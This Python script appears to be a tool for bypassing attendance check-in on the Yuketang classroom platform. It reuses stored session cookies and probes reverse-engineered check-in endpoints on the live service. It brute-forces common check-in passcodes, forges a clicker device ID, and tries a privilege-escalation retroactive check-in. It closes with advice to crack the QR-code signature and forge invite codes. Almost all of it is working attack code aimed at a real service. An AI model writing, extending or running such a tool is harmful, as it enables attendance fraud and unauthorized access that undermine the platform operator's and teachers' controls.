#!/usr/bin/env python3
"""
雨课堂签到突破测试脚本 v2（纯 Cookie 认证）

基于逆向发现的关键 API：
  - /api/v3/lesson/notkn/checkin（Web 端无 Token 签到，不受 LESSON_END 限制）
  - /api/v3/lesson/checkin（桌面端签到）
  - /api/v3/vote-machine/lesson-check-in（投票器签到）

从 yuketang_session.json 读取 Cookie，不会修改 session 文件。
"""
import hashlib
import json
import time
import sys
import random
import string
from datetime import datetime

import requests

# ========== 配置 ==========
SESSION_FILE = "yuketang_session.json"
BASE = "https://changjiang.yuketang.cn"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
DESKTOP_HEADERS = {
    "xtbz": "ykt",
    "desktop-v": "v2",
    "X-Client": "desktop",
    "Origin": "file://",
}

# 错误码分类：判断"离成功有多近"
# 离成功最近的错误（只差一个有效参数）
NEAR_SUCCESS_CODES = {
    10037: "暗号错误（接口可达，只差正确暗号）",
    50023: "邀请码过期（接口可达，只差有效邀请码）",
    50003: "邀请码无效（接口可达，只差正确格式）",
}
# 课堂状态相关（需要活跃课堂）
LESSON_STATE_CODES = {
    50004: "课堂已结束",
    50002: "课堂未授权",
}
# 认证相关（换身份或换 API）
AUTH_CODES = {
    50000: "未认证",
    401: "HTTP 401",
    403: "HTTP 403",
}
# ===========================


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def load_session():
    """从 session 文件加载 Cookie"""
    with open(SESSION_FILE, "r") as f:
        state = json.load(f)

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})
    s.headers.update(DESKTOP_HEADERS)

    cookies = state.get("desktop_cookies", [])
    if not cookies:
        log("❌ session 文件中没有 Cookie，请先 python3 yuketang_helper.py --qr")
        sys.exit(1)

    for c in cookies:
        s.cookies.set(c["name"], c["value"],
                      domain=c.get("domain", "changjiang.yuketang.cn"),
                      path=c.get("path", "/"))
    return s, state


# 测试结果收集
report = []


def record(name, status, detail="", priority=0):
    """记录一条测试结果，priority 越高越重要"""
    report.append({"name": name, "status": status, "detail": detail, "priority": priority})


def api(session, method, path, **kwargs):
    """发起请求，返回 (json_data, http_status)"""
    url = f"{BASE}{path}"
    try:
        r = session.request(method, url, timeout=10, **kwargs)
        ct = r.headers.get("Content-Type", "")
        if "json" in ct:
            return r.json(), r.status_code
        return None, r.status_code
    except Exception as e:
        return None, str(e)


def classify_response(data, http_status):
    """分类 API 响应，返回 (is_success, category, msg)"""
    if data is None:
        return False, "error", f"HTTP {http_status} (非 JSON)"
    code = data.get("code", data.get("Status", None))
    msg = str(data.get("msg", data.get("Message", data.get("message", ""))))[:80]

    if code == 0 or code == 200:
        return True, "success", msg
    if code in NEAR_SUCCESS_CODES:
        return False, "near", f"{NEAR_SUCCESS_CODES[code]} ({msg})"
    if code in LESSON_STATE_CODES:
        return False, "lesson", f"{LESSON_STATE_CODES[code]} ({msg})"
    if code in AUTH_CODES or http_status in (401, 403):
        return False, "auth", f"认证失败 ({msg})"
    return False, "other", f"code={code} {msg}"


# ==============================================================
#  测试函数
# ==============================================================

def test_login(session):
    """验证 Cookie 登录态"""
    print("\n" + "=" * 60)
    print("  [1] 验证 Cookie 登录态")
    print("=" * 60)

    data, status = api(session, "GET", "/api/v3/user/basic-info")
    ok, cat, msg = classify_response(data, status)
    if ok:
        u = data["data"]
        info = f"用户={u.get('name')} uid={u.get('id')} 学校={u.get('school')}"
        log(f"✅ {info}")
        record("Cookie 登录态", "✅ 有效", info)
        return u.get("id")
    log(f"❌ {msg}")
    record("Cookie 登录态", "❌ 无效", msg)
    return None


def test_active_lesson(session, state):
    """获取活跃课堂"""
    print("\n" + "=" * 60)
    print("  [2] 获取活跃课堂")
    print("=" * 60)

    data, status = api(session, "GET", "/api/v3/classroom/on-lesson-upcoming-exam")
    ok, cat, msg = classify_response(data, status)
    if ok:
        active = data["data"].get("onLessonClassrooms", [])
        if active:
            lid = active[0].get("lessonId")
            cid = active[0].get("classroomId")
            log(f"★ 活跃课堂: lesson={lid} classroom={cid}")
            record("活跃课堂", "✅ 有课堂进行中", f"lesson={lid}", priority=5)
            return lid, cid, True
    log("无活跃课堂，使用历史 ID（结果仅供参考）")
    lid = state.get("last_checkin", {}).get("lesson_id")
    record("活跃课堂", "⚠️ 无活跃课堂", "使用历史 ID")
    return lid, None, False


def test_notkn_checkin_deep(session, is_active):
    """
    深度测试 /api/v3/lesson/notkn/checkin
    这是 Web 端签到的核心 API，不需要课堂 Token（notkn = no token）
    """
    print("\n" + "=" * 60)
    print("  [3] 深度测试 notkn/checkin（Web 端无 Token 签到）")
    print("=" * 60)

    ep = "/api/v3/lesson/notkn/checkin"

    # 测试 1：各种 source 值
    print("\n  → source 值穷举：")
    for src in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14]:
        payload = {"source": src}
        if src == 6:
            payload["inviteCode"] = "AAAAA"
            payload["joinIfNotIn"] = True
        elif src == 14:
            payload["inviteCode"] = "12345"

        data, status = api(session, "POST", ep, json=payload)
        ok, cat, msg = classify_response(data, status)
        icon = "🔥" if ok else "✅" if cat == "near" else "⚠️" if cat == "lesson" else "✗"
        log(f"    source={src:>2}: {icon} {msg}")

        if ok:
            record(f"notkn source={src}", "🔥 签到成功", msg, priority=10)
        elif cat == "near":
            record(f"notkn source={src}", "✅ 接口可达（差有效参数）", msg, priority=7)
        time.sleep(0.15)

    # 测试 2：source=6 暗号碰撞（短暗号尝试）
    print("\n  → source=6 暗号碰撞（常见暗号）：")
    common_codes = [
        "12345", "00000", "11111", "66666", "88888",
        "AAAAA", "aaaaa", "abcde", "ABCDE", "abc12",
        "qwert", "asdfg", "zxcvb", "hello", "yuket",
    ]
    for code in common_codes:
        data, status = api(session, "POST", ep,
                           json={"source": 6, "inviteCode": code, "joinIfNotIn": True})
        ok, cat, msg = classify_response(data, status)
        if ok:
            log(f"    🔥🔥🔥 暗号={code} 签到成功！")
            record(f"notkn 暗号碰撞", "🔥 成功", f"暗号={code}", priority=10)
            break
        elif cat == "near" and "10037" not in msg:
            # 不是"暗号错误"的其他 near 响应
            log(f"    ⚠️ 暗号={code}: {msg}")
        time.sleep(0.1)
    else:
        log("    ✗ 常见暗号均未命中")

    # 测试 3：source=14 参数组合探测
    print("\n  → source=14 参数组合探测：")
    test_payloads = [
        {"source": 14, "inviteCode": "12345"},
        {"source": 14, "ticket": "12345"},
        {"source": 14, "inviteCode": "12345", "joinIfNotIn": True},
        {"source": 14, "code": "12345"},
        {"source": 14, "invite_code": "12345"},
        {"source": 14, "c": "test", "t": str(int(time.time())), "s": "test", "v": "1"},
    ]
    for i, payload in enumerate(test_payloads):
        keys = [f"{k}={str(v)[:10]}" for k, v in payload.items() if k != "source"]
        label = ", ".join(keys)
        data, status = api(session, "POST", ep, json=payload)
        ok, cat, msg = classify_response(data, status)
        icon = "🔥" if ok else "✅" if cat == "near" else "✗"
        log(f"    [{label}]: {icon} {msg}")
        if ok:
            record(f"notkn source=14 组合", "🔥 成功", label, priority=10)
        elif cat == "near":
            record(f"notkn source=14 ({label})", "✅ 接口可达", msg, priority=6)
        time.sleep(0.15)

    # 测试 4：不带 source，直接传 inviteCode
    print("\n  → 无 source 参数测试：")
    for payload in [
        {"inviteCode": "AAAAA"},
        {"inviteCode": "12345"},
        {"inviteCode": "AAAAA", "joinIfNotIn": True},
    ]:
        data, status = api(session, "POST", ep, json=payload)
        ok, cat, msg = classify_response(data, status)
        log(f"    {payload}: {msg}")
        if ok:
            record("notkn 无 source", "🔥 成功", str(payload), priority=10)
        time.sleep(0.15)


def test_desktop_checkin(session, lesson_id, is_active):
    """测试桌面端签到 API"""
    print("\n" + "=" * 60)
    print("  [4] 桌面端签到 (/api/v3/lesson/checkin)")
    print("=" * 60)

    if not lesson_id:
        record("桌面端签到", "⏭️ 跳过", "无 lessonId")
        return

    # 普通签到
    data, status = api(session, "POST", "/api/v3/lesson/checkin",
                       json={"lessonId": str(lesson_id), "source": 1})
    ok, cat, msg = classify_response(data, status)
    log(f"  source=1: {msg}")
    if ok:
        record("桌面端签到 source=1", "🔥 成功", msg, priority=10)
    elif cat == "lesson":
        record("桌面端签到 source=1", "⚠️ 课堂已结束", msg)

    # 暗号签到
    data, status = api(session, "POST", "/api/v3/lesson/checkin",
                       json={"lessonId": str(lesson_id), "source": 6,
                              "inviteCode": "AAAAA", "joinIfNotIn": True})
    ok, cat, msg = classify_response(data, status)
    log(f"  source=6 (暗号): {msg}")
    if cat == "near":
        record("桌面端签到 暗号", "✅ 接口可达", msg, priority=5)


def test_vote_machine(session, lesson_id, is_active):
    """测试投票器签到"""
    print("\n" + "=" * 60)
    print("  [5] 投票器签到 (source_type=82)")
    print("=" * 60)

    if not lesson_id:
        record("投票器签到", "⏭️ 跳过", "无 lessonId")
        return

    device_id = "PEN_" + hashlib.md5(str(lesson_id).encode()).hexdigest()[:12].upper()
    now_ms = int(time.time() * 1000)
    payload = {
        "lesson_id": str(lesson_id),
        "devices": [{"id": device_id, "dt": now_ms}],
        "submit_time": now_ms,
        "source_type": 82,
    }

    data, status = api(session, "POST", "/api/v3/vote-machine/lesson-check-in", json=payload)
    if data is None:
        record("投票器签到", "❌ 失败", f"HTTP {status}")
        return

    code = data.get("code", data.get("Status", "?"))
    if code == 200 or code == 0:
        rd = data.get("Data") or data.get("data", {})
        users = rd.get("check_in_users", []) if isinstance(rd, dict) else []
        if users:
            log(f"🔥 投票器签到成功！签到用户: {users}")
            record("投票器签到", "🔥 成功", f"签到用户数={len(users)}", priority=10)
        else:
            log(f"✓ 接口接受请求 (code={code})，但无签到用户")
            record("投票器签到", "⚠️ 接口接受但未实际签到", f"device={device_id}", priority=3)
    else:
        msg = data.get("msg", data.get("Message", ""))
        log(f"✗ code={code} {msg}")
        record("投票器签到", "❌ 失败", f"code={code} {msg}")


def test_other_endpoints(session, uid, is_active):
    """测试其他发现的端点"""
    print("\n" + "=" * 60)
    print("  [6] 其他端点探测")
    print("=" * 60)

    # 补签
    print("\n  → 补签接口越权：")
    data, status = api(session, "POST", "/api/v3/lesson/checkin/revise",
                       json={"identityId": str(uid)})
    ok, cat, msg = classify_response(data, status)
    log(f"    {msg}")
    if ok:
        record("补签接口越权", "🔥 成功", f"uid={uid}", priority=10)

    # 动态邀请码
    print("\n  → 动态邀请码获取：")
    for client in ["desktop", "mobile", "web"]:
        headers = {"X-Client": client}
        if client == "desktop":
            headers["desktop-v"] = "v2"
        old_h = dict(session.headers)
        session.headers.update(headers)
        data, status = api(session, "GET", "/api/v3/lesson/fetch-dynamic-invitation",
                           params={"v": 2})
        session.headers.clear()
        session.headers.update(old_h)
        ok, cat, msg = classify_response(data, status)
        if ok:
            qr = data.get("data", {}).get("qrContent", "?")
            log(f"    🔥 [{client}] 成功！qrContent={qr[:60]}...")
            record(f"动态邀请码 [{client}]", "🔥 成功", qr[:50], priority=10)
        else:
            log(f"    [{client}]: {msg}")
        time.sleep(0.2)

    # legacy lesson token
    print("\n  → Legacy Lesson Token：")
    data, status = api(session, "GET", "/api/legacy/lesson/get-token")
    ok, cat, msg = classify_response(data, status)
    log(f"    {msg}")
    if ok:
        log(f"    ★ Token 数据: {json.dumps(data.get('data', {}), ensure_ascii=False)[:200]}")
        record("Legacy Lesson Token", "✅ 成功", str(data.get("data", {}))[:50], priority=5)


# ==============================================================
#  报告输出
# ==============================================================

def print_report(is_active):
    """打印结构化测试报告"""
    # 按优先级排序
    sorted_report = sorted(report, key=lambda r: -r.get("priority", 0))

    print("\n")
    print("╔" + "═" * 72 + "╗")
    print("║" + "  雨课堂签到突破测试报告 v2".center(58) + "║")
    print("║" + f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}".center(68) + "║")
    if not is_active:
        print("║" + "  ⚠️  当前无活跃课堂，签到测试结果仅供参考".center(52) + "║")
    print("╠" + "═" * 72 + "╣")

    for r in sorted_report:
        detail = r["detail"][:50] + "..." if len(r["detail"]) > 50 else r["detail"]
        print(f"║  {r['status']} {r['name']}")
        if detail:
            print(f"║     └─ {detail}")
    print("╚" + "═" * 72 + "╝")

    # 分类汇总
    success = [r for r in report if "🔥" in r["status"]]
    reachable = [r for r in report if "✅ 接口可达" in r["status"] or "✅ 成功" in r["status"]]
    near = [r for r in report if "差有效参数" in r.get("status", "") or "差有效" in r.get("detail", "")]

    print("\n" + "─" * 60)
    if success:
        print("🔥 已确认可行的签到方法：")
        for r in success:
            print(f"   • {r['name']}: {r['detail']}")

    reachable_only = [r for r in reachable if "🔥" not in r["status"] and "登录" not in r["name"]]
    if reachable_only:
        print("\n✅ 接口可达（差一个有效参数）：")
        for r in reachable_only:
            print(f"   • {r['name']}: {r['detail']}")

    if not success and not reachable_only:
        print("❌ 本次测试未发现可直接使用的签到方法")

    print("\n💡 建议：")
    # 根据发现给出建议
    notkn_near = [r for r in report if "notkn" in r["name"] and ("接口可达" in r["status"] or "成功" in r["status"])]
    if notkn_near:
        print("   1. notkn/checkin 是最有前景的突破口，不受 LESSON_END 限制")
        print("   2. 在上课时采集动态二维码 URL（c/t/s/v 参数），用 qr_sign_analyzer.py 分析签名")
        print("   3. 破解签名后可直接伪造 inviteCode 签到")
    else:
        print("   1. 在有活跃课堂时重新运行此测试")
        print("   2. 采集动态二维码 URL 用于签名分析")

    print("─" * 60)


# ==============================================================
#  主流程
# ==============================================================
def main():
    session, state = load_session()

    # 1. 验证登录态
    uid = test_login(session)
    if not uid:
        log("Cookie 无效，无法继续。请重新登录。")
        print_report(False)
        sys.exit(1)

    # 2. 获取课堂
    lesson_id, classroom_id, is_active = test_active_lesson(session, state)

    # 3. 核心测试
    test_notkn_checkin_deep(session, is_active)       # 重点：Web 端无 Token 签到
    test_desktop_checkin(session, lesson_id, is_active)  # 桌面端签到
    test_vote_machine(session, lesson_id, is_active)   # 投票器签到
    test_other_endpoints(session, uid, is_active)       # 其他端点

    # 4. 输出报告
    print_report(is_active)


if __name__ == "__main__":
    main()
